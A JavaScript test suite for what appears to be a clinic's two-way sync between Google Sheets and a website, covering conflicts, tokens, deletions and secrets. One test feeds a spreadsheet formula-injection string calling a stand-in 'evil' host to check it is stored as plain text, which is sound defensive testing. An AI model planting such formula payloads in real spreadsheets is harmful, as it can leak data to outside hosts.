test('a wrong sync secret (42501) shows the fix in the header; a busy website (BUSY) says nothing and the next tick works', () => {
  const { env, server } = world({ patients: BASE_PATIENTS });
  env.props.user.set('AAJ_SYNC_SECRET', 'not-the-secret');
  env.ticks(1);
  assert.match(headerOf(env, 'Gulshan KHI'), /^Website \u00b7 \u2717 \d\d:\d\d sync secret not accepted\. Dr\. Ali: Aaj Sync > Set up$/);
  env.props.user.set('AAJ_SYNC_SECRET', SECRET);
  server.faults.busy = true;
  const before = headerOf(env, 'Gulshan KHI');
  env.advance(61000);
  env.ticks(1);
  assert.equal(headerOf(env, 'Gulshan KHI'), before, 'BUSY: the header is left alone');
  server.faults.busy = false;
  env.ticks(1);
  assert.equal(server.state.visits.length, 3);
});

test('no secret saved: the header says to set up and nothing is sent; the secret never appears in the sheet or in the document properties', () => {
  const { env, server } = world({ patients: BASE_PATIENTS });
  env.props.user.delete('AAJ_SYNC_SECRET');
  env.ticks(2);
  assert.equal(server.calls.length, 0);
  assert.match(headerOf(env, 'Gulshan KHI'), /not set up/);
  env.props.user.set('AAJ_SYNC_SECRET', SECRET);
  settle(env);
  for (const [k, v] of env.props.document) assert.ok(!String(v).includes(SECRET), 'document property ' + k);
  for (const b of env.books) for (const sh of b.sheets) for (const row of sh.values()) for (const c of row) assert.ok(!String(c).includes(SECRET));
  assert.equal(env.fetchLog[0].params.headers.apikey, env.global('AAJ').KEY);
  assert.equal(env.fetchLog[0].url, 'https://xbgcthpxwrjntfujejet.supabase.co/rest/v1/rpc/aaj_sync');
  assert.deepEqual(Object.keys(JSON.parse(env.fetchLog[0].params.payload)).sort(), ['p_payload', 'p_secret']);
});

test('the script lock: while another run holds it, a tick does nothing (no call, no write)', () => {
  const { env, server } = world({ patients: BASE_PATIENTS });
  env.lockHeld = true;
  const before = JSON.stringify(env.tab('Gulshan KHI').values());
  env.ticks(2);
  assert.equal(server.calls.length, 0);
  assert.equal(JSON.stringify(env.tab('Gulshan KHI').values()), before);
  env.lockHeld = false;
  settle(env);
  assert.equal(server.state.visits.length, 3);
  assert.equal(env.lockHeld, false, 'the lock is released after a run');
});

test('night: between midnight and 08:00 nothing is sent; at 08:00 the sync starts', () => {
  const { env, server } = world({ patients: BASE_PATIENTS, at: '07:50' });
  env.advance(61000);
  env.ticks(2);
  assert.equal(server.calls.length, 0, 'before 08:00');
  assert.equal(env.stats.fetches, 0);
  env.at(TODAY, '08:01');
  env.ticks(2);
  assert.ok(server.calls.length >= 1);
});

// ------------------------------------------------------------------------------------------------ both ways
const GUL = 'Gulshan KHI';
/** a Gulshan tab that has been synced: One (row 2, Completed), Two (3, Treatment), Three (4, Waiting, Mr# 9702), Four (5, Scheduled), Five (6, Mr# 9705, Kit 80k), Six (7); every row has a patient file */
const SYNCED_ROWS = fixture.rows[GUL].map((r, i) => (i === 2 ? ['9702', ...r.slice(1)]
  : i === 3 ? ['9704', 'Sample Person Four', '', 'Scaling', '', 'Scheduled', 'Group 4', '', '', '', '', '03001110004', '']
  : i === 4 ? ['9705', ...r.slice(1)] : r));
const SYNC_PATIENTS = [{ mr: '9702', name: 'Sample Person Three', phone: '03001110003' }, { mr: '9704', name: 'Sample Person Four', phone: '03001110004' }, { mr: '9705', name: 'Sample Person Five', phone: null }];
function synced(opts = {}) {
  const { extra = [], ...rest } = opts;
  const w = world({ patients: [...BASE_PATIENTS, ...SYNC_PATIENTS, ...extra], rows: { [GUL]: SYNCED_ROWS }, ...rest });
  settle(w.env, 3);
  return w;
}
const webVisit = (server, name) => visitsOfPatient(server, name)[0];
const quiet = (env, server, n = 3) => {   // n ticks with nothing to do: no rows sent, nothing written
  const calls = server.calls.length, written = env.stats.cellsWritten || 0;
  const out = env.ticks(n);
  assert.equal(out.reduce((a, t) => a + t.rows, 0), 0, 'no rows sent');
  assert.equal(env.stats.cellsWritten || 0, written, 'no cell written');
  assert.equal(server.calls.length, calls + n, 'one call per tick');
};

test('a website change reaches the sheet by itself; afterwards the two sides are quiet (no rewrite loop)', () => {
  const { env, server } = synced();
  const r = rowOf(env, GUL, 'Sample Person Two');
  const v = webVisit(server, 'Sample Person Two');
  server.editVisit(v.id, { status: 'completed', details: 'Brac 16 13 45 46 U L 018' });
  env.ticks(1);
  assert.equal(cellOf(env, GUL, r, 'waiting'), 'Completed');
  assert.equal(cellOf(env, GUL, r, 'treatment details'), 'Brac 16 13 45 46 U L 018');
  assert.equal(cellOf(env, GUL, r, 'months'), '04 Photo', 'a cell nobody changed keeps the way it was typed');
  assert.equal(cellOf(env, GUL, r, 'group'), 'Group 1, Group 2');
  quiet(env, server);
});

test('a sheet edit reaches the website within a minute, even while the row is still "busy"; the cell itself is not touched', () => {
  const { env, server } = synced();
  const r = rowOf(env, GUL, 'Sample Person One');
  setCell(env, GUL, r, 'waiting', 'Treatment');
  setCell(env, GUL, r, 'treatment details', 'U L 018 Pc refresh');
  env.tickAfter(20000);
  const v = webVisit(server, 'Sample Person One');
  assert.equal(v.status, 'in_treatment');
  assert.equal(v.details, 'U L 018 Pc refresh');
  assert.equal(cellOf(env, GUL, r, 'waiting'), 'Treatment');
  assert.equal(statusOf(env, GUL, r), '✓ On website');
  quiet(env, server);
});

test('edits on both sides in different cells both survive; the busy row waits a minute for the website\'s change', () => {
  const { env, server } = synced();
  const r = rowOf(env, GUL, 'Sample Person One');
  const v = webVisit(server, 'Sample Person One');
  setCell(env, GUL, r, 'treatment details', 'sheet: wire change');
  server.editVisit(v.id, { treatment_label: 'RCT' });
  env.tickAfter(25000);
  assert.equal(v.details, 'sheet: wire change', 'the sheet\'s edit arrived at once');
  assert.equal(cellOf(env, GUL, r, 'treatment'), 'Monthly', 'the row was edited 25 s ago: the script does not write into it');
  env.tickAfter(61000);
  assert.equal(cellOf(env, GUL, r, 'treatment'), 'RCT', 'a minute later the website\'s change lands');
  assert.equal(v.details, 'sheet: wire change');
  assert.equal(statusOf(env, GUL, r), '✓ On website');
  quiet(env, server);
});

test('the same cell changed on both sides: the later edit wins (website later -> the sheet shows it and says so)', () => {
  const { env, server } = synced();
  const r = rowOf(env, GUL, 'Sample Person One');
  const v = webVisit(server, 'Sample Person One');
  env.advance(30000);
  setCell(env, GUL, r, 'treatment details', 'sheet text');             // 08:..:30
  env.advance(5000);
  server.editVisit(v.id, { details: 'website text' });                 // 5 s later
  env.tickAfter(5000);
  assert.equal(v.details, 'website text', 'the website\'s later edit is kept');
  assert.match(statusOf(env, GUL, r), /^⚠ Website change kept for: Treatment Details$/);
  env.tickAfter(61000);
  assert.equal(cellOf(env, GUL, r, 'treatment details'), 'website text', 'once the row is quiet the sheet shows the website\'s text');
  quiet(env, server);
});

test('the same cell changed on both sides: sheet later -> the website takes the sheet\'s text', () => {
  const { env, server } = synced();
  const r = rowOf(env, GUL, 'Sample Person One');
  const v = webVisit(server, 'Sample Person One');
  env.advance(30000);
  server.editVisit(v.id, { details: 'website text' });
  env.advance(5000);
  setCell(env, GUL, r, 'treatment details', 'sheet text, later');
  env.tickAfter(5000);
  assert.equal(v.details, 'sheet text, later');
  assert.equal(statusOf(env, GUL, r), '✓ On website');
  env.tickAfter(61000);
  env.ticks(1);
  assert.equal(cellOf(env, GUL, r, 'treatment details'), 'sheet text, later');
});

test('doctors are merged: the website adds one, the sheet adds one and removes one: the visit and the cell keep both sides\' changes', () => {
  const { env, server } = synced();
  const r = rowOf(env, GUL, 'Sample Person One');
  const v = webVisit(server, 'Sample Person One');
  assert.deepEqual(v.doctors.slice().sort(), ['c-haniya', 'c-samrah']);
  server.editVisit(v.id, { doctors: [...v.doctors, 'c-zunash'] });
  setCell(env, GUL, r, 'doctor', 'Dr. Samrah Khan, Hira Anis');
  env.tickAfter(25000);
  assert.deepEqual(v.doctors.slice().sort(), ['c-hira', 'c-samrah', 'c-zunash'], 'Haniya removed by the sheet, Zunash added by the website, Hira added by the sheet');
  env.tickAfter(61000);
  env.ticks(1);
  assert.equal(cellOf(env, GUL, r, 'doctor'), 'Dr. Samrah Khan, Dr. Zunash Suhail, Hira Anis', 'the sheet shows the merged list');
  quiet(env, server);
});

test('an unknown doctor name stays in the cell and on the website\'s row; the row says which name to add', () => {
  const { env, server } = synced();
  const r = rowOf(env, GUL, 'Sample Person Two');
  assert.match(statusOf(env, GUL, r), /Not on the website's doctor list: Dr\. Maheen Fatima/);
  assert.equal(cellOf(env, GUL, r, 'doctor'), 'Dr. Zunash, Dr. Maheen Fatima, Dr. Ali Rashid');
  quiet(env, server);
});

test('a cell being typed in (edited in the last 60 s) is never overwritten, whatever the website says', () => {
  const { env, server } = synced();
  const r = rowOf(env, GUL, 'Sample Person Three');
  const v = webVisit(server, 'Sample Person Three');
  setCell(env, GUL, r, 'reminder', 'Called');                         // staff are in this row right now
  server.editVisit(v.id, { status: 'in_treatment', details: 'website wrote this' });
  for (let i = 0; i < 2; i++) env.tickAfter(15000);
  assert.equal(cellOf(env, GUL, r, 'waiting'), 'Waiting', 'status not written while the row is busy');
  assert.equal(cellOf(env, GUL, r, 'treatment details'), '');
  assert.equal(cellOf(env, GUL, r, 'reminder'), 'Called');
  // other rows are not held up
  const r1 = rowOf(env, GUL, 'Sample Person One');
  server.editVisit(webVisit(server, 'Sample Person One').id, { status: 'cancelled' });
  env.tickAfter(10000);
  assert.equal(cellOf(env, GUL, r1, 'waiting'), 'Cancelled', 'a quiet row is updated at once');
  env.tickAfter(61000);
  env.ticks(1);
  assert.equal(cellOf(env, GUL, r, 'waiting'), 'Treatment');
  assert.equal(cellOf(env, GUL, r, 'treatment details'), 'website wrote this');
  assert.equal(cellOf(env, GUL, r, 'reminder'), 'Called');
  assert.equal(webVisit(server, 'Sample Person Three').texts.reminder, 'Called', 'Reminder is sheet-only: it went to the website\'s staff-only sheet text');
  quiet(env, server);
});

test('a new walk-in with an Mr# typed in the sheet waits 60 s after its last edit; keeps waiting while edited; then gets its token and status', () => {
  const { env, server } = synced({ extra: [{ mr: '9800', name: 'Walk Ina', phone: '03005550001' }] });
  const countNew = () => rowsSent(server).filter((x) => x.set.name === 'Walk Ina').length;
  env.typeRow(GUL, 8, ['9800', 'Walk Ina', '', 'Checkup', '', '', '', '', '', '', '', '03005550001', '']);
  env.tickAfter(30000);
  assert.equal(countNew(), 0, '30 s after typing');
  env.advance(25000); setCell(env, GUL, 8, 'treatment', 'Scaling'); env.tickAfter(25000);
  assert.equal(countNew(), 0, 'edited again 25 s ago: still waiting');
  env.tickAfter(40000);
  assert.equal(countNew(), 1, 'quiet for 65 s: sent');
  assert.equal(rowsSent(server).find((x) => x.set.name === 'Walk Ina').set.treatment, 'Scaling');
  env.ticks(1);
  assert.equal(cellOf(env, GUL, 8, 'mr'), '9800');
  assert.equal(cellOf(env, GUL, 8, 'token'), '6', 'the token the website numbered');
  assert.equal(cellOf(env, GUL, 8, 'waiting'), 'Waiting', 'the status the website chose');
  assert.equal(statusOf(env, GUL, 8), '\u2713 On website');
});

test('a new walk-in with NO Mr# is a checkup patient: it waits 60 s too, no patient file is made, the Mr# cell stays empty', () => {
  const { env, server } = synced();
  const patients = server.state.patients.length;
  env.typeRow(GUL, 8, ['', 'Walk Ina', '', 'Checkup', '', '', '', 'Dr Haniya', '', '', '', '03005550001', '']);
  env.tickAfter(30000);
  assert.equal(server.state.checkups.length, 0, 'waiting');
  env.tickAfter(40000);
  env.ticks(1);
  assert.equal(server.state.checkups.length, 1);
  const c = server.state.checkups[0];
  assert.deepEqual([c.name, c.phone, c.checkup_for, c.doctors, c.day_status, c.source, c.branch, c.date], ['Walk Ina', '03005550001', 'Checkup', 'Dr Haniya', 'waiting', 'google_sheet', 'GUL', TODAY]);
  assert.equal(server.state.patients.length, patients, 'no patient file');
  assert.equal(cellOf(env, GUL, 8, 'mr'), '');
  assert.equal(cellOf(env, GUL, 8, 'token'), '', 'a checkup has no token from the website');
  assert.equal(cellOf(env, GUL, 8, 'waiting'), 'Waiting', 'the status the website chose is filled in');
  assert.equal(statusOf(env, GUL, 8), '\u2713 Checkup patient: no Mr#, no patient file.');
  quiet(env, server);
});

test('status words: Waiting, Treatment, Scheduled, blank and unknown never become Completed; blank is filled in; unknown asks for a fix', () => {
  const names = ['Walk A', 'Walk B', 'Walk C', 'Walk D', 'Walk E', 'Walk F', 'Walk G', 'Walk H'];
  const words = ['Waiting', 'Treatment', 'Scheduled', '', 'Banana', 'Completed', 'cancelled', 'No show'];
  const patients = names.map((n, i) => ({ mr: String(9810 + i), name: n, phone: '0300777000' + (i + 1) }));
  const rows = names.map((n, i) => [String(9810 + i), n, '', 'Checkup', '', words[i], '', '', '', '', '', '0300777000' + (i + 1), '']);
  const { env, server } = world({ rows: { [GUL]: rows }, patients });
  settle(env, 3);
  const st = (n) => webVisit(server, n).status;
  assert.deepEqual(names.map(st), ['waiting', 'in_treatment', 'scheduled', 'waiting', 'waiting', 'completed', 'cancelled', 'no_show']);
  assert.equal(cellOf(env, GUL, 5, 'waiting'), 'Waiting', 'blank status: the website\'s status is filled in');
  assert.equal(cellOf(env, GUL, 6, 'waiting'), 'Banana', 'unknown word: left as typed');
  assert.match(statusOf(env, GUL, 6), /^\u26a0 .*Status "Banana" not understood\. Use Waiting, Treatment, Completed, Scheduled, Cancelled or No show\.$/);
  const sent = rowsSent(server);
  assert.equal(sent.find((x) => x.set.name === 'Walk D').set.status, undefined, 'an empty Status cell is never sent');
  assert.equal(sent.find((x) => x.set.name === 'Walk A').set.status.v, 'waiting');
  quiet(env, server);
});

test('status words of a checkup row: the same words, except Scheduled (a checkup cannot be scheduled: it is Waiting)', () => {
  const words = ['Waiting', 'Treatment', 'Completed', 'cancelled', 'No show', 'Scheduled'];
  const rows = words.map((w, i) => ['', 'Check ' + i, '', 'Checkup', '', w, '', '', '', '', '', '0300666000' + i, '']);
  const { env, server } = world({ rows: { [GUL]: rows } });
  settle(env, 3);
  assert.deepEqual(server.state.checkups.map((c) => c.day_status), ['waiting', 'in_treatment', 'completed', 'cancelled', 'no_show', 'waiting']);
  assert.equal(cellOf(env, GUL, 7, 'waiting'), 'Waiting', 'the Scheduled word is replaced by what the website kept');
  assert.match(statusOf(env, GUL, 7), /^\u26a0 A checkup cannot be Scheduled\. Saved as Waiting\./);
  quiet(env, server);
});

test('one bad row does not hold up the others: a photo-month Completed is saved with the website\'s warning, a row with an oversized cell says so', () => {
  const rows = [
    ['9701', 'Sample Person One', '4', 'Monthly', '1', 'Waiting', '', '', '', '', '', '03001110001', ''],
    ['9703', 'Sample Person Six', '', 'Checkup', '2', 'Waiting', '', '', 'x'.repeat(600), '', '', '03001110006', ''],
    ['146', 'Sample Person Two', '', 'Checkup', '3', 'Waiting', '', '', '', '', '', '03001110002', ''],
  ];
  const { env, server } = world({ patients: BASE_PATIENTS, rows: { [GUL]: rows } });
  server.state.photoMonths.push(4);
  settle(env, 3);
  setCell(env, GUL, 2, 'waiting', 'Completed');
  env.advance(61000);
  env.ticks(2);
  assert.equal(webVisit(server, 'Sample Person One').status, 'completed');
  assert.match(statusOf(env, GUL, 2), /^\u26a0 Completed from the sheet\. The website's photo step was skipped \(owner rule\)\.$/);
  assert.equal(webVisit(server, 'Sample Person One').override, 'Completed in the Google Sheet (owner rule, 9 Oct 2026)', 'and the override says exactly that');
  assert.match(statusOf(env, GUL, 3), /^✗ Too long: details \(max 500 letters\)\.$/);
  assert.equal(statusOf(env, GUL, 4), '✓ On website', 'the row after the bad one went through');
  assert.equal(webVisit(server, 'Sample Person Two').token, 3);
  assert.match(headerOf(env, GUL), /2 need attention/);
});

test('tokens: the sheet numbers per group (token 1 three times), the website numbers once per day: typed tokens stay, the clash is reported', () => {
  const rows = [
    ['9821', 'Walk A', '', 'Checkup', '1', 'Waiting', 'Group 1', '', '', '', '', '03008880001', ''],
    ['9822', 'Walk B', '', 'Checkup', '1', 'Waiting', 'Group 2', '', '', '', '', '03008880002', ''],
    ['9823', 'Walk C', '', 'Checkup', '1', 'Waiting', '', '', '', '', '', '03008880003', ''],
    ['9824', 'Walk D', '', 'Checkup', '2', 'Waiting', 'Group 1', '', '', '', '', '03008880004', ''],
  ];
  const patients = rows.map((r) => ({ mr: r[0], name: r[1], phone: r[11] }));
  const { env, server } = world({ rows: { [GUL]: rows }, patients });
  settle(env, 3);
  assert.deepEqual([2, 3, 4, 5].map((r) => cellOf(env, GUL, r, 'token')), ['1', '1', '1', '2'], 'the typed tokens are untouched');
  assert.match(statusOf(env, GUL, 3), /Token 1 is already used by Walk A\. Token not changed on the website\./);
  assert.match(statusOf(env, GUL, 4), /Token 1 is already used/);
  assert.equal(statusOf(env, GUL, 2), '\u2713 On website');
  const tokens = ['Walk A', 'Walk B', 'Walk C', 'Walk D'].map((n) => webVisit(server, n).token);
  assert.equal(new Set(tokens).size, 4, 'the website kept one token per patient: ' + tokens);
  quiet(env, server);
});

test('a website token never overwrites kit text in the Token cell, but does fill a blank one and follow a number', () => {
  const { env, server } = synced();
  const rKit = rowOf(env, GUL, 'Sample Person Five');
  const rNum = rowOf(env, GUL, 'Sample Person One');
  server.editVisit(webVisit(server, 'Sample Person Five').id, { token: 9 });
  server.editVisit(webVisit(server, 'Sample Person One').id, { token: 12 });
  env.ticks(2);
  assert.equal(cellOf(env, GUL, rKit, 'token'), 'Kit 80k');
  assert.equal(cellOf(env, GUL, rNum, 'token'), '12');
  const r = rowOf(env, GUL, 'Sample Person Three');
  setCell(env, GUL, r, 'token', '');
  env.tickAfter(61000); env.ticks(1);
  assert.equal(cellOf(env, GUL, r, 'token'), String(webVisit(server, 'Sample Person Three').token), 'a blank Token cell is filled with the website\'s number');
});

test('month "04 Photo", group "Group 1, Group 2", "Group 4" are kept as typed and cause no rewrite; a website change replaces them', () => {
  const { env, server } = synced();
  const r2 = rowOf(env, GUL, 'Sample Person Two');
  const r4 = rowOf(env, GUL, 'sample person four');
  assert.equal(cellOf(env, GUL, r2, 'months'), '04 Photo');
  assert.equal(cellOf(env, GUL, r2, 'group'), 'Group 1, Group 2');
  const v2 = webVisit(server, 'Sample Person Two');
  assert.equal(v2.braces_month, 4);
  assert.equal(v2.group, 1, 'the first group 1-3');
  quiet(env, server);
  server.editVisit(v2.id, { group: 3, braces_month: 5 });
  env.ticks(1);
  assert.equal(cellOf(env, GUL, r2, 'group'), 'Group 3');
  assert.equal(cellOf(env, GUL, r2, 'months'), '5');
  assert.equal(cellOf(env, GUL, r4, 'group'), 'Group 4', 'an unplaced row keeps its text');
});

test('P.P, Healthwire and Reminder are the sheet\'s own: typed values go to the website, the website\'s dues never overwrite them', () => {
  const { env, server } = synced();
  const r1 = rowOf(env, GUL, 'Sample Person One');
  assert.equal(webVisit(server, 'Sample Person One').texts.pp, '35k');
  assert.equal(webVisit(server, 'Sample Person One').texts.healthwire, 'Done');
  assert.ok(!('pp' in webVisit(server, 'Sample Person One').cells), 'staff text is not on the visit row a patient can read');
  server.patientByMr('9701').dues = 50000;
  server.editVisit(webVisit(server, 'Sample Person One').id, { details: 'x' });
  env.ticks(2);
  assert.equal(cellOf(env, GUL, r1, 'p.p'), '35k', 'the website\'s dues (50,000) are not written over the typed 35k');
  setCell(env, GUL, r1, 'p.p', '10k');
  env.tickAfter(61000);
  assert.equal(webVisit(server, 'Sample Person One').texts.pp, '10k');
});

test('a visit the website cancels shows as Cancelled; one it deletes is marked "deleted on the website" and never sent again', () => {
  const { env, server } = synced();
  const r3 = rowOf(env, GUL, 'Sample Person Three');
  const r6 = rowOf(env, GUL, 'Sample Person Five');
  server.editVisit(webVisit(server, 'Sample Person Three').id, { status: 'cancelled' });
  server.removeVisit(webVisit(server, 'Sample Person Five').id);
  env.ticks(1);
  assert.equal(cellOf(env, GUL, r3, 'waiting'), 'Cancelled');
  assert.equal(statusOf(env, GUL, r6), '✗ This visit was deleted on the website. Delete this row.');
  const sentBefore = rowsSent(server).length;
  env.ticks(3);
  assert.equal(rowsSent(server).length, sentBefore, 'the deleted visit\'s row is not sent again');
  assert.equal(cellOf(env, GUL, r6, 'patient'), 'Sample Person Five', 'and not removed from the sheet');
});

test('a website-only visit is added at the bottom with its phone kept as text; cancelled ones come too; once only', () => {
  const { env, server } = synced();
  server.addPatient({ mr: '9799', name: 'Website Walker', phone: '03001110099' });
  server.addPatient({ mr: '9798', name: 'Cancelled Carl', phone: '03001110098' });
  const v = server.addVisit({ branch: 'GUL', date: TODAY, mr: '9799', status: 'waiting', token: 7, treatment: 'Checkup', details: '=IMPORTXML("http://evil")', doctors: ['c-ali', 'c-hira'] });
  server.addVisit({ branch: 'GUL', date: TODAY, mr: '9798', status: 'cancelled' });
  server.patientByMr('9799').dues = 12000;
  env.ticks(1);
  const sh = env.tab(GUL);
  const r = rowOf(env, GUL, 'Website Walker');
  assert.equal(r, 8, 'right below the last patient row');
  assert.equal(sh.text(r, colOf(env, GUL, 'mr')), '9799');
  assert.equal(sh.kind(r, colOf(env, GUL, 'contact')), 's', 'a phone is text, so the leading 0 survives');
  assert.equal(sh.text(r, colOf(env, GUL, 'contact')), '03001110099');
  assert.equal(sh.text(r, colOf(env, GUL, 'token')), '7');
  assert.equal(sh.text(r, colOf(env, GUL, 'waiting')), 'Waiting');
  assert.equal(sh.text(r, colOf(env, GUL, 'doctor')), 'Dr. Ali Rashid, Hira Anis');
  assert.equal(sh.text(r, colOf(env, GUL, 'p.p')), '12,000');
  assert.equal(sh.text(r, colOf(env, GUL, 'treatment details')), '=IMPORTXML("http://evil")', 'text from the website never runs as a formula');
  assert.equal(sh.kind(r, colOf(env, GUL, 'treatment details')), 's');
  assert.equal(env.stats.formulaWrites, 0);
  assert.equal(statusOf(env, GUL, r), '✓ Added from the website');
  assert.equal(sh.text(r, colOf(env, GUL, 'sync key')), 'W-' + v.id);
  assert.equal(cellOf(env, GUL, r + 1, 'waiting'), 'Cancelled');
  env.ticks(3);
  assert.equal(env.tab(GUL).used().rows, 9, 'added once');
  assert.equal(v.sheet_key, 'W-' + v.id, 'the website claimed the key: the row and the visit are one');
  quiet(env, server);
});

test('stray cells far below the list (DHA has "P.P" at row 146 and "Group" at 899) are never overwritten by an added row', () => {
  const { env, server } = world({ tabs: ['DHA KHI'], rows: { 'DHA KHI': [] }, patients: [] });
  const sh = env.tab('DHA KHI');
  for (const [r, c, v] of fixture.stray['DHA KHI']) { if (r > sh.maxRows) sh.maxRows = r + 5; sh._set(r, c, { kind: 's', v }); }
  sh._set(3, 10, { kind: 's', v: 'P.P' });             // a stray label right under the list
  server.addPatient({ mr: '8800', name: 'Dha Walker', phone: '03001110800' });
  for (let i = 0; i < 3; i++) server.addVisit({ branch: 'DHA', date: TODAY, mr: '8800' });
  server.state.visits.length = 1;
  env.ticks(4);
  assert.equal(rowOf(env, 'DHA KHI', 'Dha Walker'), 2);
  assert.equal(sh.text(3, 10), 'P.P', 'the stray label is untouched');
  assert.equal(sh.text(146, 10), 'P.P');
  assert.equal(sh.text(997, 7), 'Group');
});

test('a row DELETED in the sheet removes the waiting visit from the website too; a Completed one is kept and its row put back with the reason', () => {
  const { env, server } = synced();
  const idThree = webVisit(server, 'Sample Person Three').id;
  env.deleteRows(GUL, rowOf(env, GUL, 'Sample Person Three'));     // a person deletes the row (right-click, Delete row): Google runs "on change", not "on edit"
  env.ticks(2);
  assert.equal(server.visitById(idThree), undefined, 'waiting, nothing attached: removed from the website');
  assert.equal(rowOf(env, GUL, 'Sample Person Three'), null, 'and the removed patient is not put back');
  assert.match(env.tab('Aaj Sync log').values().map((r) => r.join(' ')).join('\n'), /Sample Person Three .*the visit is removed from the website too/);
  quiet(env, server);
  env.deleteRows(GUL, rowOf(env, GUL, 'Sample Person One'));
  env.ticks(2);
  assert.equal(webVisit(server, 'Sample Person One').status, 'completed', 'completed: kept');
  const back = rowOf(env, GUL, 'Sample Person One');
  assert.ok(back > 4, 'put back at the bottom');
  assert.match(statusOf(env, GUL, back), /^\u26a0 Not removed: this visit is Completed on the website\. To take a patient off, set Status to Cancelled\.$/);
  assert.equal(env.tab(GUL).text(back, colOf(env, GUL, 'sync key')), webVisit(server, 'Sample Person One').sheet_key);
  quiet(env, server);
});

test('a deleted row that a person brings back (Ctrl+Z) brings the visit back with it', () => {
  const { env, server } = synced();
  const r3 = rowOf(env, GUL, 'Sample Person Three');
  const sh = env.tab(GUL);
  const width = sh.used().cols;
  const saved = []; for (let c = 1; c <= width; c++) saved.push(sh._get(r3, c));
  const idThree = webVisit(server, 'Sample Person Three').id;
  const doctors = webVisit(server, 'Sample Person Three').doctors.slice();
  env.deleteRows(GUL, r3);
  env.ticks(2);
  assert.equal(server.visitById(idThree), undefined);
  // Ctrl+Z: the row is back at its place with its hidden cells
  sh.insertRowsAfter(sh.getMaxRows(), 1);
  const lastRow = sh.used().rows;
  for (let rr = lastRow; rr >= r3; rr--) for (let c = 1; c <= width; c++) { const x = sh._get(rr, c); sh._set(rr + 1, c, x); sh._set(rr, c, null); }
  saved.forEach((cell, i) => { if (cell) sh._set(r3, i + 1, cell); });
  env.ctx.aajOnChange({ changeType: 'INSERT_ROW', source: env.book });
  env.ticks(2);
  const v = server.visitById(idThree);
  assert.ok(v, 'the same visit is back');
  assert.equal(v.sheet_key, sh.text(r3, colOf(env, GUL, 'sync key')));
  assert.deepEqual(v.doctors, doctors);
  assert.equal(statusOf(env, GUL, r3), '\u2713 On website');
  quiet(env, server);
});

test('deleting more than three rows at once, or a quarter of a small tab, or a tab that suddenly reads empty, removes nothing: everything is put back as "Needs attention"', () => {
  const rows = [], patients = [];
  for (let i = 0; i < 12; i++) {
    patients.push({ mr: String(9830 + i), name: `Walk ${i + 1}`, phone: `0302${String(2000000 + i).slice(1)}` });
    rows.push([String(9830 + i), `Walk ${i + 1}`, '', 'Checkup', '', 'Waiting', '', '', '', '', '', `0302${String(2000000 + i).slice(1)}`, '']);
  }
  const { env, server } = world({ rows: { [GUL]: rows }, patients });
  settle(env, 3);
  assert.equal(server.state.visits.length, 12);
  env.deleteRows(GUL, 2, 4);
  env.ticks(2);
  assert.equal(server.state.visits.length, 12, 'nothing removed');
  assert.ok(server.state.visits.every((v) => v.status === 'waiting'));
  assert.equal(rows.filter((_, i) => exactRow(env, GUL, `Walk ${i + 1}`)).length, 12, 'all twelve rows are on the sheet again');
  assert.match(statusOf(env, GUL, exactRow(env, GUL, 'Walk 1')), /^\u26a0 Needs attention: 4 rows disappeared at once, so nothing was removed from the website\./);
  assert.match(headerOf(env, GUL), /4 need attention/);
  // two at once out of twelve is allowed (less than a quarter of the tab)
  const w3 = world({ rows: { [GUL]: rows }, patients });
  settle(w3.env, 3);
  w3.env.deleteRows(GUL, 2, 2);
  w3.env.ticks(2);
  assert.equal(w3.server.state.visits.length, 10, 'two rows deleted from a tab of twelve: removed');
  assert.equal(w3.server.state.visits.every((v) => v.status === 'waiting'), true);
  // two of eight is a quarter: held
  const w2 = world({ rows: { [GUL]: rows.slice(0, 8) }, patients });
  settle(w2.env, 3);
  w2.env.deleteRows(GUL, 2, 2);
  w2.env.ticks(2);
  assert.equal(w2.server.state.visits.length, 8, 'two rows of eight (a quarter) held');
  assert.match(statusOf(w2.env, GUL, exactRow(w2.env, GUL, 'Walk 1')), /Needs attention: 2 rows disappeared at once/);
  // the whole tab reads empty (an accident, or the nightly clear): wait three ticks before believing it, and then remove nothing
  const w4 = world({ rows: { [GUL]: rows.slice(0, 2) }, patients });
  settle(w4.env, 3);
  w4.env.deleteRows(GUL, 2, 2);
  const sentBefore = w4.server.calls.length;
  w4.env.ticks(2);
  assert.equal(w4.server.calls.length, sentBefore, 'an empty tab is not sent for the first two minutes');
  assert.equal(w4.server.state.visits.length, 2);
  w4.env.ticks(1);
  assert.equal(w4.server.state.visits.length, 2, 'and when it is sent, two visits vanishing at once are put back');
});

test('a copied row gets a new key; the website says the patient is already on the list and names the row', () => {
  const { env, server } = synced();
  const r = rowOf(env, GUL, 'Sample Person One');
  const sh = env.tab(GUL);
  const copy = sh.row(r);
  copy.forEach((v, i) => { if (v !== '') sh._set(9, i + 1, { kind: 's', v }); });
  env.touch();
  env.advance(61000);
  env.ticks(2);
  assert.equal(server.state.visits.filter((v) => server.patientByMr(v.mr).name === 'Sample Person One').length, 1);
  assert.match(statusOf(env, GUL, 9), /^✗ Already on this list in row 2 \(Mr# 9701\)\. Put both treatments in one row and delete this one\.$/);
  assert.notEqual(sh.text(9, colOf(env, GUL, 'sync key')), sh.text(2, colOf(env, GUL, 'sync key')), 'the copy was re-keyed');
  assert.equal(statusOf(env, GUL, 2), '✓ On website', 'the original is not disturbed');
});

test('two different people typed with the same Mr# (a real case in the DHA tab): the second row is refused, nothing is merged', () => {
  const { env, server } = world({ tabs: ['DHA KHI'], patients: [{ mr: '8641', name: 'Sample Person Nine', phone: '03001110009' }] });
  settle(env, 3);
  assert.equal(server.state.visits.length, 1);
  assert.equal(statusOf(env, 'DHA KHI', 2), '✓ On website');
  assert.match(statusOf(env, 'DHA KHI', 3), /^✗ Already on this list in row 2 \(Mr# 8641\)/);
  assert.equal(cellOf(env, 'DHA KHI', 3, 'patient'), 'Sample Person Ten');
  assert.equal(cellOf(env, 'DHA KHI', 3, 'treatment details'), 'U018 Upper Pc', 'the second row\'s text is untouched');
});

test('changing the Mr# of a row to another patient never moves the visit: the old visit stays with its patient, the row becomes a new row', () => {
  const { env, server } = synced();
  server.addPatient({ mr: '9750', name: 'Sample Person Fifty', phone: '03001110050' });
  const r = rowOf(env, GUL, 'Sample Person One');
  const v1 = webVisit(server, 'Sample Person One');
  setCell(env, GUL, r, 'patients name', 'Sample Person Fifty');
  setCell(env, GUL, r, 'mr', '9750');
  env.advance(61000);
  env.ticks(3);
  assert.equal(v1.mr, '9701', 'the visit did not change patient');
  assert.equal(visitsOfPatient(server, 'Sample Person Fifty').length, 1, 'the new patient has a visit of their own');
